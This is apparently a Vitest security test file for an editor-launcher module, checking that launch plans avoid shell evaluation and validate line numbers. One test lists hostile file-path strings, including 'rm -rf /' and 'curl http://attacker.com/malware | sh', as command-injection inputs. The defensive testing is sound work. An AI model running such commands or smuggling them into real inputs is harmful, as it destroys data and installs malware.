import { describe, it, expect } from 'vitest';
import { buildEditorLaunchPlan, buildFolderLaunchPlan, SUPPORTED_EDITORS } from '../editor-launcher.js';

describe('Editor Launcher Security Tests (F-01 / P-03)', () => {
  it('supports all whitelisted editors', () => {
    for (const editor of SUPPORTED_EDITORS) {
      const plan = buildEditorLaunchPlan({
        editor,
        targetFile: '/project/src/App.tsx',
        targetLine: 42,
        projectRoot: '/project',
      });
      expect(plan.bin).toBeDefined();
      expect(Array.isArray(plan.args)).toBe(true);
    }
  });

  it('treats hostile shell metacharacters as literal argument strings (no command injection)', () => {
    const hostilePaths = [
      '"; touch /tmp/pwned; "',
      '`rm -rf /`',
      '$(id > /tmp/whoami)',
      '/path/with/\nnewlines/and;&|characters.tsx',
      'foo.tsx; curl http://attacker.com/malware | sh',
    ];

    for (const hostilePath of hostilePaths) {
      const plan = buildEditorLaunchPlan({
        editor: 'cursor',
        targetFile: hostilePath,
        targetLine: 10,
        projectRoot: '/project',
      });

      // The binary is strictly the editor binary, never sh, bash, or cmd
      expect(plan.bin).toBe('cursor');
      // The argument array directly contains the exact hostile string without shell evaluation
      expect(plan.args).toEqual(['-g', `${hostilePath}:10:1`]);

      if (plan.fallback) {
        expect(plan.fallback.bin).toBe('open');
        expect(plan.fallback.args[0]).toBe(`cursor://file${hostilePath}:10:1`);
      }
    }
  });

  it('validates targetLine and targetColumn as positive integers with fallback', () => {
    const plan = buildEditorLaunchPlan({
      editor: 'vscode',
      targetFile: '/project/src/Card.tsx',
      targetLine: -5,
      targetColumn: 0,
      projectRoot: '/project',
    });

    expect(plan.args).toEqual(['-g', '/project/src/Card.tsx:1:1']);
  });

  it('builds safe folder launch plan with argument array (no shell)', () => {
    const folderPlan = buildFolderLaunchPlan('/project/.agent-hover/screenshots');
    expect(folderPlan.bin).toBeDefined();
    expect(folderPlan.args).toEqual(['/project/.agent-hover/screenshots']);
  });
});
